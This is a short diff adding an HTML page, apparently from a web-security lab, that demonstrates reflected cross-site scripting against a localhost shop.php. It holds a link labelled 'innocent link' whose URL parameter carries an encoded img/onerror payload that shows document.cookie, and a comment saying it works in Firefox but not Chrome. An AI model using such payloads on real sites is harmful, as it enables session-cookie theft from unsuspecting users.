@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>xss attack</title>
+	<script src="jquery-2.1.4.min.js"></script>
+</head>
+<body>
+	<p>hello my friend, reflected xss</p>
+
+	<!-- Doesn't work in chrome, so try firefox :>  -->
+	<a 
+		href="http://localhost/websec/shop.php?add=%3Cimg%20src%3D'%2F'%20onerror%3D'window.alert(document.cookie)'%3E"
+	>innocent link</a>
+</body>
+</html>
